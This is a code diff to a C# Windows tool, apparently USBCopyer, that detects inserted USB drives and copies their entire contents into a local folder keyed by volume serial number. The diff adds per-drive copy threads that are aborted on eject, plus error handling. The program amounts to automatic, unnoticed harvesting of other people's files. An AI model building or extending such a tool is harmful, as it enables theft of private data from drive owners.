@@ -20,7 +20,7 @@ namespace USBCopyer
         public string[] blackid;
         public FileStream logf;
         public StreamWriter logw;
-        //public Dictionary<string,Thread> copyThread = new Dictionary<string,Thread>(); //正在复制文件的线程 分区号=>线程
+        public Dictionary<string,Thread> copyThread = new Dictionary<string,Thread>(); //正在复制文件的线程 分区号=>线程
         public Host()
         {
             InitializeComponent();
@@ -141,57 +141,93 @@ namespace USBCopyer
             Environment.Exit(0);
         }
 
+        public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
+        public const int DBT_DEVICEARRIVAL = 0x8000;  //就是用来表示U盘可用的。一个设备或媒体已被插入一块，现在可用。
+        public const int DBT_DEVICEQUERYREMOVE = 0x8001;  //审批要求删除一个设备或媒体作品。任何应用程序也不能否认这一要求，并取消删除。
+        public const int DBT_DEVICEQUERYREMOVEFAILED = 0x8002;  //请求删除一个设备或媒体片已被取消。
+        public const int DBT_DEVICEREMOVECOMPLETE = 0x8004;  //一个设备或媒体片已被删除。
+        public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
+
         protected override void DefWndProc(ref Message m)
         {
-            if (m.Msg == 0x0219)
+            if (m.Msg == WM_DEVICECHANGE)
             {
-                string disk = string.Empty;
-                if(m.WParam.ToInt32() == 0x8000) {
+                int wp = m.WParam.ToInt32();
+                //存储设备插/拔/弹
+                if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING) {
                     DEV_BROADCAST_HDR dbhdr = (DEV_BROADCAST_HDR)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_HDR));
-                    if (dbhdr.dbch_devicetype == 0x00000002)
+                    if (dbhdr.dbch_devicetype == 2)
                     {
                         DEV_BROADCAST_VOLUME dbv = (DEV_BROADCAST_VOLUME)Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                         if (dbv.dbcv_flags == 0)
                         {
                             char[] volums = GetVolumes(dbv.dbcv_unitmask);
-                            disk += volums[0].ToString() + ":";
-                            ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\""+disk+"\"");
-                            string diskser = diskinfo.Properties["VolumeSerialNumber"].Value.ToString();
-                            msg(disk + " - " + diskser, "存储设备已插入");
-                            if(EnableToolStripMenuItem.Checked)
+                            string disk = volums[0].ToString() + ":";
+                            if(wp == DBT_DEVICEARRIVAL) //存储设备插入
                             {
-                                if (blackid.Contains(diskser))
+                                try
                                 {
-                                    log("黑名单磁盘序列号：" + diskser + " 取消复制！");
-                                    return;
-                                }
-                                if (blackdisk.Contains(disk.Substring(0, 1)))
-                                {
-                                    log("黑名单分区号：" + disk + " 取消复制！");
-                                    return;
-                                }
-                                Thread th = new Thread(() =>
-                                {
-                                    if(Properties.Settings.Default.sleep > 0)
+                                    ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\""+disk+"\"");
+                                    string diskser = diskinfo.Properties["VolumeSerialNumber"].Value.ToString();
+                                    msg(disk + " - " + diskser, "存储设备已插入");
+                                    if (EnableToolStripMenuItem.Checked)
                                     {
-                                        log("延迟复制：将在 " + Properties.Settings.Default.sleep + "秒后进行复制");
-                                        Thread.Sleep(Properties.Settings.Default.sleep * 1000);
-                                        if(!Directory.Exists(disk + "\\"))
+                                        if (blackid.Contains(diskser))
                                         {
-                                            log("在延迟复制期间存储设备已拔出，复制取消：" + disk + " - " + diskser,1);
+                                            log("黑名单磁盘序列号：" + diskser + " 取消复制！");
                                             return;
                                         }
+                                        if (blackdisk.Contains(disk.Substring(0, 1)))
+                                        {
+                                            log("黑名单分区号：" + disk + " 取消复制！");
+                                            return;
+                                        }
+                                        copyThread[disk] = new Thread(() =>
+                                        {
+                                            if (Properties.Settings.Default.sleep > 0)
+                                            {
+                                                log("延迟复制：将在 " + Properties.Settings.Default.sleep + "秒后进行复制");
+                                                Thread.Sleep(Properties.Settings.Default.sleep * 1000);
+                                                if (!Directory.Exists(disk + "\\"))
+                                                {
+                                                    log("在延迟复制期间存储设备已拔出，复制取消：" + disk + " - " + diskser, 1);
+                                                    return;
+                                                }
+                                            }
+                                            if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskser))
+                                            {
+                                                log("清空输出目录：" + dir + diskser);
+                                                Directory.Delete(dir + diskser, true);
+                                            }
+                                            CopyDirectory(disk + "\\", dir + diskser);
+                                            log("设备数据复制完成：" + disk + " - " + diskser);
+                                            copyThread.Remove(disk);
+                                        });
+                                        copyThread[disk].Start();
                                     }
-                                    if(Properties.Settings.Default.autorm && Directory.Exists(dir + diskser))
-                                    {
-                                        log("清空输出目录：" + dir + diskser);
-                                        Directory.Delete(dir + diskser, true);
-                                    }
-                                    CopyDirectory(disk + "\\", dir + diskser);
-                                    log("设备数据复制完成：" + disk + " - " + diskser);
-                                });
-                                th.Start();
+                                }
+                                catch(Exception ex)
+                                {
+                                    log("获取插入的存储设备信息失败：" + ex.ToString());
+                                }
                             }
+                            else  //存储设备拔/弹出
+                            {
+                                try
+                                {
+                                    if (copyThread.ContainsKey(disk))
+                                    {
+                                        if (copyThread[disk].IsAlive)
+                                        {
+                                            copyThread[disk].Abort();
+                                            copyThread[disk] = null;
+                                        }
+                                        copyThread.Remove(disk);
+                                        log("用户弹出了存储设备，强制停止复制：" + disk,1);
+                                    }
+                                }
+                                catch (Exception) {}
+                            } 
                         }
                     }
                 }
@@ -265,7 +301,7 @@ namespace USBCopyer
                             FileInfo fi1 = new FileInfo(fsi.FullName);
                             if(checkExt(fi1.Extension))
                             {
-                                log("复制文件：" + destName);
+                                log("复制文件：" + fsi.FullName);
                                 if (File.Exists(destName))
                                 {
                                     switch (Properties.Settings.Default.conflict)
@@ -308,12 +344,12 @@ namespace USBCopyer
                         }
                         catch (Exception ex)
                         {
-                            log("创建目录："+destName+"：失败：" + ex.ToString(),2);
+                            log("创建目录：" + destName + "：失败：" + ex.ToString(), 2);
                         }
                     }
                 }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 log("复制目录失败，设备可能被强行拔出：" + ex.ToString());
             }
